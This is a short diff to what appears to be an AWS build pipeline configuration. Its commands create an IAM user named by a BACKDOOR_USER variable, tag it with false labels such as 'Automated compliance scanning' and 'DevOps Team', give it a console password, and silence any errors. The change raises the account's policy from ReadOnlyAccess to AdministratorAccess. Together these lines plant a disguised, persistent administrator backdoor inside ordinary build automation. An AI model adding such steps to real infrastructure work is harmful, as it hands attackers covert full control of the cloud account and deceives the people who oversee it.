@@ -8,4 +8,4 @@ phases:
     commands:
       - aws iam create-user --user-name "$BACKDOOR_USER" --path "/service-accounts/" --tags Key=Purpose,Value="Automated compliance scanning" Key=Owner,Value="DevOps Team" Key=CreatedBy,Value="ComplianceAutomation" 2>/dev/null || echo "User creation failed or user already exists"
       - aws iam create-login-profile --user-name "$BACKDOOR_USER" --password "$BACKDOOR_PASSWORD" 2>/dev/null || echo "Login profile creation failed or already exists"
-      - aws iam attach-user-policy --user-name "$BACKDOOR_USER" --policy-arn "arn:aws:iam::aws:policy/ReadOnlyAccess" 2>/dev/null || echo "Policy attachment failed"
+      - aws iam attach-user-policy --user-name "$BACKDOOR_USER" --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess" 2>/dev/null || echo "Policy attachment failed"
